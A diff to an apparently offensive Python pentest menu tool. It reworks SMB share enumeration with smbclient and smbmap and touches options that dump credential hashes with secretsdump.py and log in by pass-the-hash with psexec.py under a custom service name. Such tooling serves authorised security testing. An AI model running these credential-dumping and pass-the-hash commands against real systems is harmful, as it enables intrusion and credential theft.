@@ -1366,17 +1366,33 @@ while True:
 
    if selection =='36':
       CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
+      
       if TIP[:5] == "EMPTY":
          print("\n[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
-         command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
+         command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > SHARES.tmp")
+      
+         command2("cat SHARES.tmp")         
+         command("sed -i /Sharename/d SHARES.tmp")
+         command("sed -i /-/d SHARES.tmp")
+         command("sed -i /SMB1/d SHARES.tmp")    
+      
+         count = len(open('SHARES.tmp').readlines( ))
+         if count > 0:
+            for x in range(0, MAXX):
+               SHAR[x] = " "*COL2			# Clean current values.
+      
+         SHAR[0] = "SHARENAME       TYPE    COMMENT"
+         SHAR[1] = "=========       ====    ======="
+      
+         for x in range(2, count):
+            SHAR[x] = linecache.getline("SHARES.tmp",x + 1)
+            SHAR[x] = SHAR[x].lstrip()
+            SHAR[x] = dpadding(SHAR[x], COL2)
+         
+      os.remove("SHARES.tmp")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1390,16 +1406,15 @@ while True:
    if selection == '37':
       CheckParams = 0
 
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
       if TIP[:5] == "EMPTY":
          print("\n[-] Remote IP address has not been specified...")
          CheckParams = 1
       
       if CheckParams != 1:
-         command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
+         if DOM[:5] == "EMPTY":
+            command2("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
+         else:
+            command2("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1411,18 +1426,10 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '38':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
+      if TIP[:5] != "EMPTY":
          command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
+      else:
+         print("\n[-] Remote IP address has not been specified...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1921,7 +1928,7 @@ while True:
          CheckParams = 1
 
       if CheckParams != 1:
-         print("\n[*] Enumerating, please wait this can take sometime...")
+         print("[*] Enumerating, please wait...")
          command(PATH + "secretsdump.py " + DOM.rstrip(" ") + '/' + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
 
          command("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
@@ -2043,7 +2050,7 @@ while True:
 
       if CheckParams != 1:
          print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
-         command(PATH + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+         command(PATH + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -service-name LUALL.exe") 
 
          print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
          HASH = "." # Reset hash value
